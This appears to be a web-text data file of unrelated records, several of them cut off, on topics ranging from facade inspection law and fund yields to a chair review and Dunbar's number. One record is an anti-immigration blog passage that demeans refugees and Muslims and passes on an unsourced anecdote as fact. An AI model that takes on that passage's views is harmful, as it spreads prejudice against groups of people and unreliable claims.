let's say Garvin. And I, you know, play out this the scene where one of us gets frustrated and we'll crumple up a piece of paper and throw it up, the other person storm out of the room. And then we asked the group afterwards, Hey, what did you observe there? And we have two columns on the flip chart, you know, one representing, not labeled yet, but one representing observations, one representing interpretations. And what a lot of people and doing of just about every single group is they, all they list are just interpretations. You are angry or upset. Garth was disrespectful.\nYou know, all these things are just pure interpretations. And then we could ask them the question, well, what did you observe? What do you observe? And we help them realize that, you know, most of what they think they're observing, they're really interpreting. And the observation in that case was throwing a piece of paper at Cora, right? The interpretation was you are angry and Gora was being disrespectful. And so that's just a, it's a big insight that people have that they, you know, they come to understand that a lot of what they're describing about the world is really they're their own interpretation and they need to own those interpretations and share them with other people so they can create better conversations.\nIt really does help the conversation when people separate those two things.\nYeah. And it's hard. It's very hard.\nYou have to keep reminding yourself. Well, it has been such a pleasure talking with both of you today, and I enjoyed reading your book. I think it's a fabulous book.

{"text": "The effects of variables impacting mass prophylaxis point-of-dispensing (POD) staffing in an infectious disease emergency could potentially aid in preparedness efforts by advising recruiting, training, and emergency planning. This project aims to explore three factors that may impact staffing capabilities for POD: pathogen, absenteeism, and response rates. These factors were explored through building an agent-based model in the NetLogo modeling platform. An agent-based modeling approach was used to emphasize the impact of indirect interaction between individuals that results as roles are filled by individuals who volunteer first. This model set the environment at different absenteeism and response levels, and different POD staffing requirements based on pathogen (influenza vaccinations or anthrax antibiotics). To measure the effects of these variables, time-to-staff and staff shortages were recorded at the end of each simulation run. For influenza conditions, staffing capabilities became more constrained as absenteeism increased, and response decreased. However, for anthrax conditions, these constraints were very mild, and the differences in these trends between influenza and anthrax were significant. Overall, this model provides an example of staffing constrains that could be anticipated if such a model were to be developed for use in local health departments. Such a model could allow for planners to find staffing weaknesses before they manifest, and tailor recruiting and training efforts accordingly to create a staff pool that would be overall more able to successfully staff PODs in an emergency. The public health significance of this project is to provide a foundation for future development of this type of agent-based model to aid in public health preparedness planning.", "meta": {"redpajama_set_name": "RedPajamaC4"}, "__index_level_0__": 1430}

Mark's biggest movement (not in the bathroom) was a 3-day drop (again, not in the bathroom) in the middle of March. On the 13th, you could buy a share of Mark at $15.21, but by March 16th he was only worth $14.06. The rest of the year was ho-hum until December 6th, the day after the birth of his son, where he started a fall that didn't bottom out until December 18th. He trended up to end the year, and to start 2013 he is up 2.19% to $16.78.\nMAB (up 10.49%) \u2013 Bunk just edged out Mark Lee for second place, gaining about a buck-fiddy from $14.39 to $15.90. Bunk's year started out well, then flatlined around the time they find out Jaime was pregnant. That flatline ended in August, which I believe is when they started telling people, but that requires research. The high (so hiiiiiiigh) for Bunk was November 23rd, where he hit $17.99. Alas, he came down from that high in December to close out the year on a downer. Currently, Bunk is up 2.29% at $16.56, but analysts have not fully figured out the impact the birth of his daughter will have. Stay tuned.\nMDH (up 44.35%) \u2013 My man does not fuck around. Harter went from $2.30 to $3.32 last year, hitting his highest point on October 9th ($4.07) just days after his engagement to Molly. The market liked that match, apparently. Harter got most of his performance in the first half of the year, gaining almost $2 through to May 3rd. He hit a couple of troughs at the end of May and beginning of June, though he had a nice upswing from there. On November 8th, the wheels came off and he dropped from $3.86 to $3.12 on November 14th. With a further drop in December, I can't say I wasn't worried for the guy. Luckily he had a little jump to finish 2012.

Sometimes, though, you want a chair that makes a statement. The Arozzi Verona Pro is such a chair. It's easy on the eyes, and it has a lot more to offer than just that.\nNow, the first thing to remember is that the Verona V2 has replaced this model, so if you want one, you'll have to buy it from a third-party supplier. Despite its age, we believe that the Verona Pro is still a worthwhile chair, and we'll explain why below.\nDimensions 52.4 x 20.9 x 20.9\"\nWeight Limit 286 lbs\nColors Black, red, blue, green, grey, orange\nMaterial PU leather\nThis chair comes with removable and adjustable lumbar/headrest cushions to allow you to remain comfortable at all times. Notice how the shape of the seat almost hugs the user: this helps to redistribute pressure throughout your body and lower the chance of back strain after long periods of sitting.\nThe seat itself boasts extra padding, and the armrests can be moved into whichever position you find most comfortable. We liked that the frame, while sturdy, is also light enough to move around comfortably. You can also rock back and forth, or recline if you'd prefer. There is, of course, a locking function for the recliner.\nIf the plain black color scheme doesn't do it for you, you might prefer one of the five other colors. With a striking, three-tone design, these chairs say, \"I'm professional but also smart and casual.\" Even the mechanisms are designed to look good, with the recliner dial covered by a sleek black and white veneer.\nYou don't have to worry about damaging it, either. With faux leather upholstery, you can quickly clean up any spills without the danger of staining or water damage. If we had to find something to complain about, it'd be the branding: is it really necessary to have three Arozzi logos? Probably not.\nThis chair comes in several easy to assemble parts. The entire assembly process should take less than 15 minutes, which is great. On the other hand, its lightweight frame lacks some of the strength that rivals boast. As such, the Verona Pro has a weight limit of just 286lbs \u2013 around 16lb less than most competing chairs.\nArozzi Enzo Review\nArozzi Torretta Review\nArozzi Milano Review", "meta": {"redpajama_set_name": "RedPajamaCommonCrawl"}, "__index_level_0__": 22210}

{"text": "M.I.S\nYMB AWARDS\nYMB NETWORK\nFetty Wap's Lawyer Sits Down With YMB and Shares Some Valuable Advice.\nI think we are all familiar with U.S. rap superstar Fetty Wap who has had global hit records such as \"Trap Queen\", \"My Way\" and \"679\" to name a few. Here at YMB our focus is all about the professionals behind the stars and educating creatives on the legal and business affairs that will govern their career. So we sat down with the man behind Fetty Wap's success, the man who brokered and negotiated the big deals including his major deal with 300 Entertainment. Navarro W. Gray is certainly no rookie when it comes to deciphering the complexities of the music business with a roster of clients boasting some of the hottest rappers and producers in hip hop. In our exclusive interview with one of Hip Hop's most sought after entertainment lawyers he talks us through why he chose a career in music law, the most important areas in a record contract, what unsigned artists should focus on + more.\nThe more we got into the interview the more we were drawn in by his warm and relatable persona.\n1. What made you pursue a career in entertainment law and what are some of the challenges you encountered?\nI wanted to pursue a career in entertainment law because since I was young I had a passion for music. I started out producing music then later became a recording artist. I opened up my own studio and begin to distribute my cd's. I had a lot of successful shows. I opened up for Jay-z, Outkast, Carl Thomas, Common and a few others. However, I had a lot of disappointing moments as a recording artist. There were a lot of people running scams on up and coming artists at that time. Thus, I begin to teach myself about copyrights, publishing, and the entire business side of the industry so that I could minimise the risk of being taken advantage. My largest challenge was breaking into the music industry as an attorney. I applied for jobs with multiple firms and got turned down over and over again. At some of the job interviews I had greater knowledge than the other candidates but just like other industries it is not always about \"what you know but who you know.\"\n2. Who have you represented?\nI represent multiple artists, producers, atheletes and models and have done business deals with various companies. The larger and most notable clients that I represent and can mention are Fetty Wap, Remy Boy Monty, Menace (Producer of Panda), Ricky Racks (Producer with credits on albums of Young Thug, Gucci, Migos etc.), NickEBeats (Producer of My Way), D-Stackz (Producer A-Boogie), Somaya Reese, Lady Luck, and Ayisha Diaz. I also represent several other entities and larger clients that I cannot mention due to a respect for their confidentiality.\n3. From a legal standpoint , what advice would you give to the unsigned artist?\nI would advise any and all unsigned artists to get their business correct. The music industry has shifted to a mostly digital platform and intertwines with the internet thus there are more ways than ever to earn money, but unless you have a knowledge of the new trends in the industry you could be missing out.\n4. Do you think its important for artists to trademarks their names ?\nI think it is very important. The registered trademark allows you to earn money off of an artist's products, merchandise and likeliness that is associated with that particular mark. It also offers the highest level of protection for the registered mark.\n5. When you are about to close a deal with a major record label for your client , what are the KEY areas you strongly negotiate?\nI look at multiple areas. While everything in a contract is very important I immediately focus on the advance, publishing, mechanical licensing, and 360 component of the deal. I must re-itereate that every single word in a contract is important and one word can change everything. Those areas are just the areas that I like to look at first.\n6. How soon do you think an unsigned artists should seek legal representation and how do they go about it?\nAn unsigned artist should seek representation as soon as they decide to take their career seriously. They would contact an attorney and get a solid foundation in place. Again, there are new ways for unsigned artists to earn immediate money off of their music and unless one is told about these techniques and ways they probably would not have a clue.\n7. If you could leave us with 3 key tips for success in the music industry what would they be?\n1. Adapt with the times;\n2. Know your audience; and\n3.

Both types of yields can be useful to help make investment decisions; however, it's important to understand how each of them work and how they can benefit investors.\nIn this article we dig down to the fundamentals of mutual fund yields and make yields easy to understand.\nWhat is the Trailing Twelve Month (TTM) Yield?\nA mutual fund's TTM Yield refers to the percentage of income the fund portfolio returned to investors over the past 12 months. The TTM is an acronym referring to \"trailing twelve months.\" It is calculated by taking the weighted average of the yields of the holdings (i.e. stocks, bonds or other mutual funds) that are in the fund portfolio.\nBy comparison, the yield for a particular fund's underlying stock holdings is calculated by dividing the total dollar amount of dividends the stock paid out as income to shareholders by the stock's share price. The TTM Yield provides recent history of a mutual fund's average dividend and interest payouts to investors.\nFor example, if you are analyzing a fund and you see that it's TTM Yield is 3.00%, it would have paid out $3,000 to an investor with $100,000 average investment amount during the previous year. However, it is important to note that the TTM Yield should be considered an estimate because it may not represent the actual income received by a particular investor.\nAlso, as with past performance, the income paid out by a mutual fund in the past year is no guarantee that it will yield the same amount over the next 12 months.\nWhat is the 30-Day SEC Yield?\nA mutual fund's 30-Day SEC Yield refers to a calculation that is based on the 30-day period ending on the last day of the previous month. The yield figure reflects the dividends and interest earned during the period, after the deduction of the fund's expenses. The yield is named for the SEC because it is the yield companies are required to report by the Securities and Exchange Commission.\nFor bond funds, the SEC yield figure approximates the yield an investor would receive in a year assuming that each bond in the portfolio is held until maturity. But keep in mind that bond fund holdings (the underlying bond securities) are not held to maturity and bond funds do not \"mature.\"\nHowever, the 30-Day SEC Yield still provides useful information to investors because it helps estimate income, expressed as a percentage, needed for planning purposes.\nTTM Yield vs 30-Day SEC Yield\nAs you may already understand by reading this article thus far, the primary difference between a mutual fund's TTM Yield and its 30-Day SEC Yield is that the latter is a more recent measure of yield. Neither figure should be considered an accurate predictor of a fund's future income-generating potential.\nAnalyzing the TTM Yield and SEC Yield Together\nA mutual fund's past dividends, interest and distribution history can shed some light on the direction of interest rates and guide expectations. For example, if the TTM Yield is higher than the 30-Day SEC Yield, the combined information reveals that the fund's future yield may fall further. This information can also be considered in combination with prevailing interest rates and the economy at large.\nGenerally, if the Federal Reserve is lowering interest rates, the yields on stocks, bonds and the mutual funds that hold these securities will also decline. For example, if the TTM Yield is 3.99% and the 30-Day SEC Yield is 2.99%, you may plan for the fund's yield over the next months and year to be below 2.99%. Just be sure to be conservative in your estimates and never expect rates to move higher in the short-term.\nThe opposite is also generally true: If the Fed is raising rates, yields on bonds will tend to rise as well. In this environment, an investor may expect the SEC Yield for a bond fund to rise. However, investors should be cautioned that bond fund prices (the NAV) tend to decrease or have returns below historic norms.\nIf you are an income investor and you are looking at a mutual fund's TTM Yield and its 30-Day SEC Yield, which one is the best yield to analyze? Or should you consider both yields? Investors looking for income are smart to learn the basics of analyzing the yield of a mutual fund. In summary, the TTM Yield shows yield over the past year and the 30-Day SEC Yield shows the most current yield (as of the last 30 days).\nDisclaimer: The information on this site is provided for discussion purposes only, and should not be misconstrued as investment advice.

Hinkle, National Optical Astronomy ObservatoryFollow\nRichard R. Joyce, National Optical Astronomy ObservatoryFollow\nPeter R.

The orbit for V1044 Cen, an M5.5 giant, has a period of 985 days and a modest eccentricity of 0.16. Hen 3-1213 is a K4 giant, yellow symbiotic with an orbital period of 533 days and a similar eccentricity of 0.18. For the M2 giant SS 73-96 the orbital period is 828 days, and this system has a somewhat larger eccentricity of 0.26. Measurement of the H i Paschen \u03b4 emission lines, which may at least partially reflect the motion of the secondary in SS 73-96, results in a mass ratio of 2.4 for the M giant relative to the presumed white dwarf. The estimated orbital inclinations of V1044 Cen and Hen 3-1213 are low, about 40\u00b0. However, for SS 73-96 the predicted inclination is 90\u00b0, and so an ephemeris for eclipses of the secondary or the hot nebula surrounding it is provided. A search of the orbital velocity residuals of V1044 Cen and SS 73-96 for pulsation periods produced no realistic or convincing period for either star.\nFrancis C.

{"text": "In 1979, a Barnard College student was killed by a piece of terra-cotta cornice that fell from an apartment building on the Upper West Side. From that incident, New York City Local Law 10 of 1980 (LL10/80) was enacted. LL10/80 required owners of buildings greater than six stories to engage a licensed professional to perform an inspection of the street fa\u00e7ade and up to 25 feet back from pedestrian access. Technical reports were filed with the NYC DOB over a two-year cycle every five years, with the first cycle beginning February 21, 1980.\nUnder LL10/80, buildings could be filed under four categories: Safe, Unsafe, Ongoing Maintenance, and Precautionary. Precautionary referred to the identification of deficiencies that required annual monitoring, and could be carried over on LL10/80 reports from cycle to cycle if the conditions appeared stable. Ongoing Maintenance was utilized for buildings that were undergoing repairs in a phased manner over a long period of time. All inspections could be performed using visual aids, such as binoculars.\nAfter four cycles of LL10/80, in 1998, there were several instances of masonry falling from buildings onto NYC sidewalks. As a result, a more stringent law was passed. Local Law 11 of 1998 (LL11/98) included inspection of all fa\u00e7ades on buildings greater than six stories, not just the street-facing wall. Visual inspections using a telephoto lens or binoculars were acceptable, but at least one complete close-up inspection of a street fa\u00e7ade from roof to ground level was required, in most cases, necessitating the use of a scaffold.\nLL11/98 also changed the categories for filing. The Qualified Exterior Wall Inspector had to designate a building as Safe, Unsafe, or Safe with a Repair and Maintenance Program (SWARMP). All SWARMP conditions had to be cured prior to the next cycle filing; otherwise, they were automatically considered Unsafe. LL11/98 remained in place for Cycles 5 and 6. All inspections and filings occurred within a two-year period from the start of each cycle.\nFrom Cycle 7 onwards, the law became known as FISP (Fa\u00e7ade Inspection Safety Program). Inspections and filing are now staggered over a four-year period in three sub-cycles. The sub-cycle a building falls under depends on the last digit of its Block Number. Filing must occur within 60 days of inspection. Similar to LL11, at least one hands-on inspection from street level to roof must occur on a street fa\u00e7ade, and all fa\u00e7ades are inspected unless 12 inches or less distance from an adjacent wall.\nAs a result of a fatal accident in 2014, supplemental inspections of balcony railings and fire escapes were required for Cycle 7. Balcony railings and connections had to be inspected even if a report for Cycle 7 has already been filed. A separate amended filing attesting to the condition of the railings had to be filed within Cycle 7. If not, the DOB considers that the FISP report has not been filed.", "meta": {"redpajama_set_name": "RedPajamaC4"}, "__index_level_0__": 67403}

{"text": "A veteran Maine State Police sergeant who is accused of driving drunk while off duty Dec. 18 is urging his colleagues not to resent or be angry with the troopers who charged him.\nParker's lawyer, Jonathan Goodman, said he was not involved in the writing or distribution of the email, but discussed it with his client after a reporter called him Wednesday.\n\"(Parker) heard a third-hand rumor somebody was upset about what has happened, and he interpreted that to mean they were giving the troopers involved a hard time, but he has no personal knowledge of anything like that,\" Goodman said.\nSteve McCausland, spokesman for the state Department of Public Safety, said he was unaware of Parker's email, which was sent Friday. Top state police commanders did not return phone calls seeking comment.\nMcCausland said Trooper Duane Doughty stopped Parker in the northbound lanes of the Maine Turnpike in Gray on the night of Dec. 18. McCausland said the stop was made a few minutes after 7:59 p.m., when a motorist called police to report that a car was being driven erratically. Soon after the stop, Doughty's supervisor, Sgt. James Urquhart, arrived at the scene, as did another trooper, whose name McCausland said he did not know.\nUnder Maine law, a person is considered to be driving drunk if he or she has blood alcohol content of 0.08 percent or greater. A first offense does not require jail time. Driving with blood alcohol content of 0.15 percent or higher carries a mandatory two days in jail.\nMcCausland said state police do not reveal blood alcohol content or other investigative details before a case gets to court, regardless of the defendant. Cumberland County District Attorney Stephanie Anderson, who said she handles most of the cases against law enforcement officers, said the Criminal History Record Information Act says the state cannot disclose pre-conviction data, including investigative information. Anderson said the case against Parker has not yet been presented to her office for review and she has no specific information about it.\nShe said she handles any law enforcement officer charged with a crime the same way she handles any other person and decisions about whether a law enforcement officer is held to a higher standard are left to a judge.\nParker is highly respected in the Maine State Police. He was selected as a cadre supervisor at the Maine Criminal Justice Academy in Vassalboro, a position given to members of the force who are regarded as role models for recruits in the 18-week basic law enforcement school. He also has served as a supervisor at the state police crime lab, a hostage negotiator and a critical-stress debriefing team leader.\nAfter graduating from high school, Parker served in the Marine Corps from 1984 to 1992. He joined the state police in 1994.\nHe is on paid administrative leave, which Goodman, his lawyer, said is customary in such cases. He was removed from his position as a cadre supervisor at the academy because, according to the staff there, anyone in that position must have an unblemished record. Parker's position has been given to Urquhart, the sergeant who participated in Parker's stop on Dec. 18. McCausland said the assignment is coincidental.\nIn his email to colleagues, Parker said he is responsible for his situation. He said it is painful, it will be hard, and he is ashamed and embarrassed.\n\"But, what I am saying is I own this and I'm prepared for the consequences,\" he wrote in the email.\nHe apologized to his colleagues for tarnishing the agency's reputation and praised the troopers who dealt with him that Sunday night. He said they were not pleased with what they had to do.\nSgt. Michael Edes, president of the Maine State Troopers Association, said he was not surprised by the letter because it reflects the kind of person Parker is. \"Robin has taken total ownership of this thing and I think he wants people to know he has,\" Edes said.\nEdes said some police officers will resent that Parker wasn't allowed to avoid the charge because, as a law enforcement officer, he faces more serious consequences than the average person. Those consequences include suspension, demotion and even revocation of his law enforcement certification, which would prevent him from working as a police officer.\nHowever, Edes said, few officers today would expect special treatment from their colleagues. He questioned whether the troopers involved are facing any backlash.\nUrquhart and Doughty, who handled the traffic stop, could not be reached for comment. Goodman, who has worked as a consultant for police departments in Maine, said giving special treatment to police officers who do wrong is not healthy and is no longer tolerated.", "meta": {"redpajama_set_name": "RedPajamaC4"}, "__index_level_0__": 21748}

{"text": "The Savage Mill Trail is a  rail trail that winds along the Little Patuxent River in Savage, Maryland.  The trail was formerly part of the Baltimore and Ohio Railroad's rail corridor through central Maryland, but the Howard County Recreation and Parks Department acquired the land in 1978.\n\nHistorical development\n\nHistorical significance\n\nThe Savage Mill Trail is located in an area that became a major manufacturing center in the early 1800s.  Near the beginning of the trail is a textile mill that was built between 1816 and 1823.  This mill along with other manufacturing companies in the area utilized the currents of the Little and Middle Patuxent Rivers to power their factories.\n\nAt the beginning of the trail is a Bollman truss bridge, which was used by the Baltimore and Ohio Railroad during the middle of the 19th century.  The Bollman truss bridge was invented in 1850 and was the first system to be made entirely of iron.  This bridge was built in 1869 and is the only remaining Bollman truss bridge of its design in the country.  It is now preserved as a National Historic Landmark.\n\nDuring the American Civil War, Savage Mill served an important role for the Union Army beginning in 1861.  Despite a limited supply of cotton, the mill was used to manufacture canvas for cannon covers and tents.  In addition, the Baltimore and Ohio Railroad line to Savage Mill transported federal troops who occasionally camped in the meadow on the north side of the railroad.\n\nIn 2014, the State of Maryland announced that funds were granted to design a bike trail from Savage through the busy Route One Corridor to North Laurel. The next day an 11-year-old boy was struck in a hit and run along the proposed route.\n\nTrail's history and evolution\nThe Howard County Recreation and Parks Department acquired the Savage Mill Trail in 1978.  At the time, the rails had all been torn up and the pathway was completely made of dirt.  Rangers from the Parks Department covered a majority of the trail with gravel in 1980, and a fresh layer of gravel is added every eight to ten years.  The trail has not undergone any significant extensions or renovations since it was acquired by the Parks Department.\n\nTrail development\n\nDesign and construction\nThe Savage Mill Trail winds along the Little Patuxent River through the grounds of an old cotton mill.  A majority of the trail is flat and covered with gravel, and it is accessible for wheel chairs, bikes, and strollers.  Towards the end of the 1-mile trail it turns into dirt before ending abruptly in the middle of a forest.  A majority of the trail is surrounded by trees on one side with views of the Little Patuxent River on the other.  There are a couple of picnic tables and benches located along the path, and the trail averages about 10 feet in width.\n\nTrail amenities\nParking for the Savage Mill Trail is located along Foundry Street, where up to twenty cars are able to fit.  From Foundry Street, it is a very short walk to the start of the trail.  Once on the trail, visitors can enjoy a picnic lunch at one of two picnic areas overlooking the Little Patuxent River.  There are also five intervals along the trail where visitors can access the riverbank via sets of wooden stairs or small pathways.\n\nCommunity\n\nTrail supporters\nThe Savage Mill Trail is managed by the Howard County Recreation and Parks Department.  The Parks Department is responsible for all maintenance and repairs of the trail.  In addition, the Department provides four rangers per day during the summer to monitor visitor behavior and ensure that the trail is kept in quality condition.\n\nSpecial events\nThere are several annual cleanups that occur along the Savage Mill Trail.  Every April, members from Project Clean Stream come to the trail and clean up trash along the Little Patuxent River.  Then in September, members from International Coastal Cleanup come to the trail and again clean up the area along the Little Patuxent River.  Finally, members of the Johns Hopkins Applied Physics Lab host an annual trail cleanup in late October or early November.\n\nIn addition to trail cleanups, the Howard County Recreation and Parks Department is in the middle of its 5-year Maryland Amphibian and Reptile Atlas.  Members of the local community are encouraged to hike Howard County trails, including the Savage Mill Trail, and take pictures of any nature that they find.\n\nThe Savage Mill Trail is also the location for occasional community group gatherings.  Columbia Dogs on the Go, a local dog-walking group in Maryland, is one group that holds events for its members to walk their dogs along the trail.\n\nFlora and fauna \nThere are ten notable bird species that inhabit the Savage Mill Trail.  Each of these birds can be spotted along the trail between March and May with the exception of the great egret, which can be found between August and November.  These birds include:\n\nBlack-billed cuckoo\nCerulean warbler\nGreat egret\nGolden-winged warbler\nLeast flycatcher\nLincoln's sparrow\nMourning warbler\nNorthern bobwhite\nProthonotary warbler\nYellow-throated warbler\n\nIn addition, there are four types of mammals that inhabit the Savage Mill Trail and are most often spotted during the warm months of the year:\n\nEastern chipmunk\nEastern gray squirrel\nRaccoon\nWhite-tailed deer\n\nFinally, the Little Patuxent River is home to over seven species of fish.  The Parks Department stocks the river with trout during the first week of October, the last week of February, and the first week of March.  Fishermen can expect to find the following fish when visiting the trail:\n\nBluegill\nBrown trout\nCarp\nGolden trout\nRainbow trout\nRedeye bass\nWhite sucker\n\nIn addition to wildlife, the Savage Mill Trail is home to seven different types of trees. White and red oaks line a large part of the trail, but all of the trees include:\n\nBeechwood\nEastern white pine\nHickory\nNorthern red oak\nSugar maple\nTulip tree\nWhite oak\n\nReferences\n\nExternal links \n TrailLink.com\n Savage Mill Trail Photo Collection\n Howard County Recreation and Parks Department\n\nRail trails in Maryland\nHiking trails in Maryland", "meta": {"redpajama_set_name": "RedPajamaWikipedia"}, "__index_level_0__": 16866}

{"text": "Wikipedia defines Dunbar's number (commonly cited as 150) as a \"theoretical cognitive limit to the number of people with whom one can maintain stable social relationships. These are relationships in which an individual knows who each person is, and how each person relates to every other person.\" Dunbar is director of the Institute of Cognitive and Evolutionary Anthropology at Oxford University and first wrote about this almost 20 years ago but the \"tipping point\" for disseminating his theory was Gladwell's citation in his book, The Tipping Point in 2000. Wikipedia's entry above is actually a quotation from The Tipping Point, which is an example of the downside of a crowdsourced encyclopedia. The ideal encyclopedia would have quoted Dunbar, the original source, not Gladwell.\nI became interested in the Dunbar number when I was exploring creating a social network based on personal compatibility. It struck me that Facebook had two disadvantages: it recommended people primarily based on having friends (or acquaintances, or connections) in common and the number of \"friends\" easily grew to an impossibly large number.\nSo if Dunbar's number suggests the ideal size of a community, what about smaller groups? During my research I came across the notion that in a hunter-gatherer society the ideal size for a hunting group was roughly a dozen. The blog, Signal vs. Noise, posted its thoughts on how small teams worked best, citing another British author, Antony Jay who wrote in his book, Corporation Man, that the ideal size for a team has been a \"ten-group\" for centuries. The basic unit for most armies is ten\u2014and has been since Roman times. Most sports teams, juries \u2026 well, you get the idea.\nIt's pretty obvious what the advantages of a team this size are: nimbleness, loose, flexible organization, quick decision-making, strong inter-dependence, well aligned interests, each individual plays a critical role. We've all experienced it. And when it works, it can be magic.\nDunbar's number came from his research as an evolutionary anthropologist. Unlike other animals, primates bond by using their hands to groom each other and he found there seemed to be a natural size to a band of primates. Dunbar wondered whether the size of primate's social networks was correlated with their brain size and found that \"within the primates there is a general relationship between the size of the brain and the size of the social group.\" He then tested his theory on human groups and found that, with remarkable consistency, for thousands of years early settlements and villages consisted of 150 people.\nOne feature of those societies was not just that you knew everyone in the group but that the group was also completely stable. No one left or entered.\nThis changed with the industrial revolution, which started the norm of social mobility we're familiar with today. Once the village structure broke down, many of society's self-regulating abilities died with it. Now we need policemen and courts of law. Obviously the Internet has given us the ability to connect with thousands of others, no longer limited by geography or social restrictions. But our brains are wired to live in these ancient societies. How do we adapt? Dunbar doesn't think we can. If we accept his assumption that his number is related to brain size, in order to process significant relationships with 10 times as many people (1,500) our brains would have to be 10x larger. And we know that ain't happening any time soon.\nObviously we're living in a world in which we all have much larger networks than our parents did. But the point of the Dunbar number is that the number of meaningful relationships we can have is still limited. Dunbar defines meaningful as based on trust and obligation.\nI'm interested in this because, as an entrepreneur, I'd love to find a way to connect people who have the potential to have a meaningful relationship. There's no question that, in an era of 5,000 Facebook friends, people are craving tighter knit communities based on compatibility. But the question I've asked here before is, what is true compatibility? And how does it manifest itself online? It's more than shared interests, it's more than compatible personality types. Can you look at your close friends or your spouse and define what it is that connects you? It certainly isn't picking lice out of each other's hair.\nA side note. When I lived in London in the early 80's, I was a big fan of \"Yes, Minister,\" the popular BBC series. Turns out Antony Jay was a co-writer of that and the author of a book I enjoyed a few years later called Management and Machiavelli as well as Corporation Man.

{"text": "When I was injured and in the hospital, a lady working there told me that the hospital passed on the costs of treating illegal immigrants to local people. If the person had insurance, then the insurance got stuck. If they didn't, then they just had to pay on a weekly basis. The hospital knew who the locals were and where they lived, and they never saw or heard of the illegals again once they left the hospital.\n(a) The savagery of the redistribution burden of immigration\u2014from working Americans, to the owners of capital and, of course, the immigrants.\n(b) While America has thinking men like this, all is not lost.\nWrong. The whole point of driver's licenses for illegal aliens is that it's a way for the state governments to aid and abet illegal immigration. State governments have no right to help illegal immigrants gain entry to the entire country, any more than they'd have the right to side with Mexico in an actual war.\n\"all of the hijackers entered the U.S. legally, which means they qualified for drivers licenses.\"\nNo, they came on tourist visas, obtained by fraud, which they overstayed, because of lack of exit tracking. Other Arab terrorists have legalized themselves during by falsely claiming to be agricultural workers.\nHomeland security is about taking useful steps to prevent another attack. It's not about keeping gainfully employed Mexican illegals from driving to work, or cracking down on the imagined hordes gaming our asylum system.\nWrong again. They're acting on the assumption that no illegal immigrant would ever kill anyone; and they will continue to ignore or mock evidence to the contrary.\nMoved by personal stories of violence and repression, President Bush has lifted the 911 cutbacks on refugees that were put in place to protect Americans. As a result, the State Department will admit an additional 20,000 refugees next year, bringing the total to 70,000, after the more manageable 29,000 in 2002 and 2003. The agency claims to be taking more care to keep out terrorists and criminals, but State's track record has not been good, either for individuals (e.g. Marko Boskic, a known war criminal who used his own name when applying for refugee status) or in their choice of ethnic groups.\nIf history is any indicator, the additional 20,000 people will be from cultures hugely inappropriate for resettlement into any highly complex modern society. The United States government will admit more illiterate tribal peoples who do not grasp the nature of doorknobs, are frightened by kitchen stoves and require training to use a light switch. But if refugees could adjust easily into daily life that increasingly requires familiarity with computerized techno-gadgets, then they wouldn't need the assistance of well paid \"experts\" from the Refugee Industrial Complex.\nBut if we must have more refugees, why not welcome thousands who are in genuine physical danger and could assimilate rapidly into American life? I refer to French Jews, who increasingly are being attacked by the growing numbers of Muslims that are now metastasizing through the French sector of Eurabia. (In a LittleGreenFootballs blog poll, France was overwhelmingly voted as the European nation most likely to be the first to institute Islamic sharia law.) Anti-Semitic street violence is now a common occurrence, to the extent that thousands of French Jews have moved to Israel, even during the height of the brutal intifada.", "meta": {"redpajama_set_name": "RedPajamaC4"}, "__index_level_0__": 21614}

In many cases however, critical essays may have the power to communicate ideas and concepts in a concise manner while books can still be seen by some academics or many practitioners as lacking the capacity to communicate the same ideas or concepts effectively. Whether or not one would agree with this view is a different issue. Yet, as a reaction to such a view it is possible to see book reviews playing the role of short essays or articles which enable readers to grasp the message a book author is trying to convey-yet in a short and quick way. In person-environment research\u2014as part of contemporary architectural discourse\u2014book reviews are important as they provide significant slices of larger arguments, but enable readers to classify, categorize, and relate those arguments to other discourses on theories of architecture and urbanism, and thereby comprehending the full spectrum of issues introduced through a specific period of time.\nIn this article, I discuss the notion of reviews and book reviews, outline the assignment delivered to architecture students at Queen's University Belfast, then present selected students' reviews. While this article is simply a presentation of students' work, the ultimate objective is to offer a package of ideas and concepts generated in the literature of person-environment interaction as viewed by the students. This is coupled with students' articulations of and reflections on how the merits and demerits of those ideas and the way in which they relate to such ideas in their reviews. While this article does not reflect on students' work and does not have a conclusion, it calls for a database that is exclusively dedicated to reviewed books on person-environment interactions, which could be published online on the web of one of the societies or associations concerned with people environment interactions including EDRA-Environmental Design Research Association and IAPS-International Association of People- Environments Studies.\nMarkus, T.

{"text": "It's Getting Real! ADV Riding Pants.\nSo it is coming down to the last bits and bobs needed for riding season. Most are less than $50 each. Not bad, and they will come with time. However, there has been one piece of gear that has been hanging over my head for a while now: Riding Pants. The issue is they are quite expensive to purchase and they really are needed. The hips, knees, shins will have armor, the fabric itself will be extremely durable and the seat will have extra for when you have to take to using the tarmac as a slide. While we don't want to do this, it is possible. The other thing they provide is some waterproofing and wicking to help keep you dry. The thick fabric will also help against things that hit or brush again your legs while riding.\nSo, I have been saving up (slowly) for some good riding pants. I was given an early birthday present and told to go buy them and the cost would be covered. This is a huge relief, as this means I will have them in time for 2 of my scheduled rides coming up soon. Keep in mind, while I do have the waterproof over-pants, they do not offer any kind of armored protection at all, only protection from water and rain. These new pants will give me the armored protection I have been saving for. I have searched, read, looked at sizing charts and asked for opinions on what to get. I was given many opinions, some ranging into fully customizable pants costing over $1000.\nI ended up deciding to go with the Klim Latitude Misano Pants. Very good reviews, more single recommendations than any other pair of pants. I did get the grey/white version to help stand out a little from the rest of the blackness of Raven and my gear. Also, to help with heat during the summer time. Below is what was on the website for them. Should have them first of next week.\nThe lightweight and durable Klim Latitude Misano Pants combine the legendary waterproof and breathable Gore-Tex membrane with Klim's tough yet comfortable Misano fabric. A full compliment of D3O armor as well as 840D Cordura in high abrasion zones provides unmatched protection without adding excess bulk and weight. Comfortable enough to wear everyday yet packed with features designed to carry you through even the most demanding adventures, the Latitude Misano Pants offer a ton of functionality for those who demand uncompromising functionality and comfort.", "meta": {"redpajama_set_name": "RedPajamaC4"}, "__index_level_0__": 13839}

